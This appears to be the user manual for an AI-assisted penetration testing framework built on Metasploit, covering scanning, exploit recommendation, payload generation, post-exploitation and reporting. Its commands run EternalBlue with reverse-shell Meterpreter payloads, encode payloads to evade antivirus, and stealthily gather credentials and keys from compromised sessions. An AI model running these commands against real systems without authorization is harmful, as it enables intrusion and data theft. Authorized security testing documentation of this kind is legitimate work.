# User Manual

Complete guide to using the Metasploit-AI Framework for AI-powered penetration testing and cybersecurity assessments.

## Table of Contents

1. [Framework Overview](#framework-overview)
2. [User Interfaces](#user-interfaces)
3. [Scanning Operations](#scanning-operations)
4. [AI Analysis Features](#ai-analysis-features)
5. [Exploitation Framework](#exploitation-framework)
6. [Post-Exploitation](#post-exploitation)
7. [Reporting System](#reporting-system)
8. [Session Management](#session-management)
9. [Configuration Management](#configuration-management)
10. [Advanced Features](#advanced-features)

## Framework Overview

Metasploit-AI combines traditional penetration testing methodologies with advanced artificial intelligence to provide:

- **Intelligent Vulnerability Assessment**: ML-powered vulnerability analysis and risk scoring
- **Smart Exploit Recommendation**: AI-driven exploit selection based on target characteristics
- **Automated Payload Generation**: Dynamic payload creation and optimization
- **Advanced Evasion**: AI-based techniques to bypass security controls

### Core Components

#### AI Engine
- **Vulnerability Analyzer**: Classifies and scores vulnerabilities using machine learning
- **Exploit Recommender**: Suggests optimal exploits based on target fingerprinting
- **Payload Generator**: Creates custom payloads with evasion techniques

#### Scanning Module
- **Network Discovery**: Fast multi-threaded network reconnaissance
- **Service Enumeration**: Detailed service detection and version identification
- **Vulnerability Detection**: Integration with CVE databases and custom checks

#### Exploitation Framework
- **Metasploit Integration**: Seamless integration with Metasploit Framework
- **Custom Exploits**: Support for custom exploit modules
- **Session Management**: Advanced post-exploitation session handling

## User Interfaces

### Web Interface

The web interface provides an intuitive dashboard for penetration testing operations.

#### Features:
- **Real-time Dashboard**: Live scan progress and results
- **Interactive Visualizations**: Network topology and vulnerability mapping
- **Report Generation**: Automated report creation and export
- **User Management**: Multi-user support with role-based access

#### Navigation:
- **Dashboard**: Overview of current operations and system status
- **Targets**: Target management and organization
- **Scanner**: Network discovery and vulnerability scanning
- **AI Analysis**: Machine learning-powered analysis tools
- **Exploits**: Exploitation framework and payload management
- **Sessions**: Active session management and interaction
- **Reports**: Report generation and export tools

### Command Line Interface (CLI)

The CLI provides powerful command-line access for advanced users.

#### Key Commands:

```bash
# Target management
msf-ai> targets add 192.168.1.0/24
msf-ai> targets list
msf-ai> targets info <target_id>

# Scanning operations
msf-ai> scan <target> --type <scan_type>
msf-ai> scan --help
msf-ai> show scans

# AI analysis
msf-ai> ai analyze --target <target>
msf-ai> ai recommend --severity <level>
msf-ai> ai predict --exploit <exploit_name>

# Exploitation
msf-ai> exploit <exploit_name> --target <target>
msf-ai> payload generate --target <target> --type <type>
msf-ai> sessions --list

# Reporting
msf-ai> report generate --format <format>
msf-ai> report export --output <filename>
```

## Scanning Operations

### Scan Types

#### Discovery Scan
Fast network discovery to identify active hosts:
```bash
msf-ai> scan 192.168.1.0/24 --type discovery
```

#### Service Scan
Detailed service enumeration and version detection:
```bash
msf-ai> scan 192.168.1.100 --type services --ports 1-65535
```

#### Vulnerability Scan
Comprehensive vulnerability assessment:
```bash
msf-ai> scan 192.168.1.100 --type vuln --deep
```

#### Web Application Scan
Specialized web application security testing:
```bash
msf-ai> scan https://example.com --type web --spider
```

#### Stealth Scan
Evasive scanning to avoid detection:
```bash
msf-ai> scan 192.168.1.0/24 --type stealth --timing paranoid
```

### Scan Configuration

#### Timing Options
- **Paranoid**: Extremely slow and stealthy
- **Sneaky**: Slow and less likely to be detected
- **Polite**: Slower scan to avoid overwhelming targets
- **Normal**: Default scanning speed
- **Aggressive**: Faster but more detectable
- **Insane**: Fastest but most detectable

#### Advanced Options
```bash
# Custom port ranges
msf-ai> scan 192.168.1.100 --ports 80,443,8080-8090

# Specific scan techniques
msf-ai> scan 192.168.1.100 --technique syn,ack,fin

# Output options
msf-ai> scan 192.168.1.100 --output-format json --save-results
```

## AI Analysis Features

### Vulnerability Analysis

The AI vulnerability analyzer provides intelligent assessment of discovered vulnerabilities:

#### Features:
- **CVSS Scoring**: Automated Common Vulnerability Scoring System assessment
- **Risk Prioritization**: AI-based risk ranking considering environmental factors
- **Exploit Availability**: Assessment of available exploits and their reliability
- **Impact Analysis**: Prediction of potential business impact

#### Usage:
```bash
# Analyze all discovered vulnerabilities
msf-ai> ai analyze --all

# Analyze specific target
msf-ai> ai analyze --target 192.168.1.100

# Deep analysis with environmental context
msf-ai> ai analyze --target 192.168.1.100 --deep --context enterprise
```

### Exploit Recommendation

AI-powered exploit recommendation based on target characteristics:

#### Recommendation Factors:
- Target operating system and version
- Service versions and configurations
- Network environment and security controls
- Historical success rates
- Payload compatibility

#### Usage:
```bash
# Get exploit recommendations for target
msf-ai> ai recommend --target 192.168.1.100

# Filter by severity level
msf-ai> ai recommend --severity critical --target 192.168.1.100

# Show success probability
msf-ai> ai recommend --target 192.168.1.100 --show-probability
```

### Payload Optimization

AI-driven payload generation and optimization:

#### Features:
- **Evasion Techniques**: Automatic AV/EDR evasion
- **Encoding Options**: Multiple encoding schemes
- **Target Optimization**: Platform-specific optimizations
- **Size Optimization**: Minimal payload footprint

#### Usage:
```bash
# Generate optimized payload
msf-ai> ai payload --target 192.168.1.100 --type meterpreter

# Generate with evasion
msf-ai> ai payload --target 192.168.1.100 --evasion advanced

# Custom payload generation
msf-ai> ai payload --target 192.168.1.100 --requirements stealth,persistence
```

## Exploitation Framework

### Exploit Execution

#### Manual Exploitation
```bash
# List available exploits
msf-ai> exploits list --target-os windows

# Show exploit information
msf-ai> exploits info ms17_010_eternalblue

# Execute exploit
msf-ai> exploit ms17_010_eternalblue --target 192.168.1.100 --payload windows/meterpreter/reverse_tcp
```

#### AI-Assisted Exploitation
```bash
# Automatic exploit selection and execution
msf-ai> ai exploit --target 192.168.1.100 --auto

# Exploit chaining
msf-ai> ai exploit --target 192.168.1.100 --chain --depth 3

# Success probability filtering
msf-ai> ai exploit --target 192.168.1.100 --min-probability 0.7
```

### Payload Management

#### Payload Types
- **Meterpreter**: Full-featured post-exploitation payload
- **Shell**: Basic command shell access
- **Reverse**: Connects back to attacker
- **Bind**: Listens on target for connections
- **Staged**: Multi-stage payload delivery
- **Stageless**: Single-stage payload

#### Payload Generation
```bash
# Generate Windows Meterpreter
msf-ai> payload generate --type windows/meterpreter/reverse_tcp --lhost 192.168.1.50 --lport 4444

# Generate with encoding
msf-ai> payload generate --type windows/shell/reverse_tcp --encoder x86/shikata_ga_nai --iterations 3

# Generate for specific architecture
msf-ai> payload generate --type linux/x64/meterpreter/reverse_tcp --arch x64
```

## Post-Exploitation

### Session Management

#### Session Operations
```bash
# List active sessions
msf-ai> sessions --list

# Interact with session
msf-ai> sessions --interact 1

# Session information
msf-ai> sessions --info 1

# Kill session
msf-ai> sessions --kill 1
```

#### Session Commands
```bash
# System information
meterpreter> sysinfo
meterpreter> getuid

# File system operations
meterpreter> ls
meterpreter> download file.txt
meterpreter> upload payload.exe

# Process operations
meterpreter> ps
meterpreter> migrate 1234
meterpreter> execute -f cmd.exe -i
```

### AI-Powered Post-Exploitation

#### Automated Information Gathering
```bash
# AI-driven reconnaissance
msf-ai> ai post-exploit --session 1 --gather-intel

# Privilege escalation suggestions
msf-ai> ai post-exploit --session 1 --privilege-escalation

# Lateral movement analysis
msf-ai> ai post-exploit --session 1 --lateral-movement
```

#### Smart Data Exfiltration
```bash
# Identify sensitive data
msf-ai> ai data-hunt --session 1 --types credentials,documents,keys

# Automated collection
msf-ai> ai collect --session 1 --priority high --stealth
```

## Reporting System

### Report Types

#### Executive Summary
High-level overview for management:
- Risk assessment summary
- Business impact analysis
- Remediation priorities
- Compliance status

#### Technical Report
Detailed technical findings:
- Vulnerability details
- Exploit procedures
- Evidence collection
- Technical remediation

#### Compliance Report
Framework-specific reporting:
- NIST Cybersecurity Framework
- OWASP Top 10
- PCI DSS requirements
- ISO 27001 controls

### Report Generation

#### Command Line
```bash
# Generate HTML report
msf-ai> report generate --format html --output pentest_report.html

# Generate PDF report
msf-ai> report generate --format pdf --template executive --output executive_summary.pdf

# Generate JSON data
msf-ai> report generate --format json --include-raw-data --output findings.json
```

#### Web Interface
1. Navigate to Reports section
2. Select report type and template
3. Configure options and filters
4. Generate and download report

### Custom Reports

#### Template Creation
```yaml
# Custom report template (YAML)
report_template:
  name: "Custom Pentest Report"
  sections:
    - executive_summary
    - methodology
    - findings
    - recommendations
    - appendices
  
  formatting:
    logo: "company_logo.png"
    colors:
      primary: "#1f4e79"
      secondary: "#2e8b57"
```

## Advanced Features

### Plugin System

#### Available Plugins
- **OSINT Integration**: Automated open-source intelligence gathering
- **Threat Intelligence**: Integration with threat intel feeds
- **Custom Scanners**: Extensible scanning modules
- **Reporting Extensions**: Custom report formats and templates

#### Plugin Management
```bash
# List installed plugins
msf-ai> plugins list

# Install plugin
msf-ai> plugins install osint_collector

# Configure plugin
msf-ai> plugins config osint_collector --api-key <key>

# Use plugin
msf-ai> osint collect --target example.com
```

### Automation and Scripting

#### Automation Scripts
```bash
# Run automation script
msf-ai> script run automated_pentest.rb --target-file targets.txt

# Create custom automation
msf-ai> script create --template discovery --name custom_scan
```

#### API Integration
```python
# Python API usage
from metasploit_ai import MSFAIClient

client = MSFAIClient('http://localhost:8080')
client.authenticate('username', 'password')

# Perform scan
scan_id = client.scan.create('192.168.1.0/24', scan_type='discovery')
results = client.scan.get_results(scan_id)

# AI analysis
analysis = client.ai.analyze_target('192.168.1.100')
recommendations = client.ai.get_recommendations(analysis_id=analysis.id)
```

### Integration with External Tools

#### Supported Integrations
- **Nmap**: Network discovery and port scanning
- **Nessus**: Vulnerability scanning
- **Burp Suite**: Web application testing
- **MISP**: Threat intelligence platform
- **TheHive**: Security incident response platform

#### Configuration
```yaml
# integration.yaml
integrations:
  nmap:
    enabled: true
    path: "/usr/bin/nmap"
    
  nessus:
    enabled: true
    server: "https://nessus.example.com:8834"
    api_key: "your_api_key"
    
  burp_suite:
    enabled: true
    api_url: "http://localhost:1337"
```

## Best Practices

### Security Considerations
- Always obtain proper authorization before testing
- Use in isolated lab environments when possible
- Follow responsible disclosure practices
- Maintain detailed logs and documentation
- Regularly update the framework and exploit database

### Performance Optimization
- Use appropriate scan timing for your environment
- Limit concurrent operations based on system resources
- Configure database connection pooling
- Use distributed scanning for large networks

### Legal and Ethical Guidelines
- Ensure you have written authorization for all testing
- Comply with local laws and regulations
- Follow your organization's security policies
- Document all activities for audit purposes

---

*For more detailed information on specific topics, refer to the specialized documentation sections.*

---

*Created by [Yashab Alam](https://github.com/yashab-cyber) and the [ZehraSec](https://www.zehrasec.com) Team*
